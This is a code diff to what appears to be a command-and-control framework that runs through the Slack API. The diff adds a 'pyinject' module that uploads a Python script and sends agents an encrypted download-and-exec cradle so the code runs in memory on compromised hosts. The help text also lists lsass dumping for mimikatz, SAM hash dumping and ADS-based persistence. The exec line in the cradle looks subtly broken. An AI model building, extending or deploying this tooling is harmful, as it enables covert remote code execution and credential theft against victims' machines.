@@ -559,10 +559,44 @@ def shellcode(bearer, commands, client_id, filepath):  # Function execute shellc
     prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
     headers = {'Authorization': 'Bearer ' + bearer}
     aes_encrypt = AES_ENCRYPT()
-    print (url)
+    print(url)
     url = aes_encrypt.encrypt(url)
     data = {"channel": commands, "text": prefix + url}
     r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)
+
+
+def pyinject(bearer, commands, client_id, filepath):  # Function execute python in memory
+    type = "command"
+    if '\\' in filepath:
+        filename = (filepath.rsplit('\\', 1)[1])
+    elif '/' in filepath:
+        filename = (filepath.rsplit('/', 1)[1])
+    else:
+        filename = filepath
+    try:
+        filepath = filepath.strip('\'').strip('\"')  # Strip quotes
+        files = {'file': open(filepath, 'rb')}
+        data = {"filename": "python.txt", "token": token}
+        r = requests.post("https://slack.com/api/files.upload", params=data, files=files)
+        result = json.loads(r.text)
+        # Slack URL of the uploaded file
+        url = result["file"]["url_private_download"]
+    except FileNotFoundError:
+        print(color("File not Found", "yellow"))
+        return False
+    except OSError:
+        print(color("File not Found", "yellow"))
+        return False
+    job_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
+    prefix = bytes(client_id + ":" + job_id + ":" + type + ":", 'utf-8')
+    headers = {'Authorization': 'Bearer ' + bearer}
+    aes_encrypt = AES_ENCRYPT()
+    print(url)
+    cradle = "python -c 'import urllib2;r=urllib2.urlopen(\"" + url + "\");exec(http://r.read())'"
+    command = aes_encrypt.encrypt(cradle)
+    data = {"channel": commands, "text": prefix + command}
+    r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)
+
 
 def beacon(bearer, commands, client_id, beacon):  # Function to change beacon time
     type = "beacon"
@@ -845,6 +879,13 @@ class AgentCmd(Cmd):  # Class for all the modules when interacting with an agent
         shellcode(bearer, commands, self.target, filepath)
         print(color("Executing shellcode on: " + self.target, "blue"))
 
+    def do_pyinject(self, args):
+        """PYINJECT - Executes a python script in memory.
+        Example: shellcode /tmp/script.py"""
+        filepath = args
+        pyinject(bearer, commands, self.target, filepath)
+        print(color("Executing python script on: " + self.target, "blue"))
+
     def do_beacon(self, args):
         """BEACON - Changes the mean(average)time in seconds that an agent checks for new commands.  20% jitter.
              Example: beacon 5  (Beacons average 5 seconds)"""
@@ -1109,6 +1150,8 @@ minidump - Returns a dump of lsass.exe to be process by mimikatz
 persist - Creates persistence by implanting a binary in an Alternate Data Stream.
           Can be activated by a scheduled task or via a run key.  Userland or Elevated.
            Usage: persist [registry|scheduler|wmi]
+pyinject - Executes a python script in memory.
+           Usage: pyinject [SERVER FILE PATH]
 samdump - Attempts to dump the SAM, SYSTEM and SECURITY files for offline hash extraction
            Usage: samdump
 shellcode - Executes x64 raw shellcode from a file.
